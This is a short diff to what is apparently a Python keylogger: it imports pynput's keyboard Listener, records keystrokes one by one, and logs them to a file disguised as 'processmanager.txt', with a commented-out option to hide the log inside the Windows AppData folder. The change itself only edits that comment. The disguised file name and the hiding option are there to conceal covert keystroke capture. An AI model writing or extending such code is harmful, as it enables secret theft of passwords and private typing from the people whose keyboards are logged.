@@ -3,7 +3,7 @@ from pynput.keyboard import Listener
 
 keys=[]
 count=0
-#path=os.environ['appdata']+'processmanager.txt'  #hides data inside appdata
+#path=os.environ['appdata']+'processmanager.txt'  #hides data inside appdata this line is used in windows only
 path='processmanager.txt'
 
 def on_press(key):  #record key strokes one by one
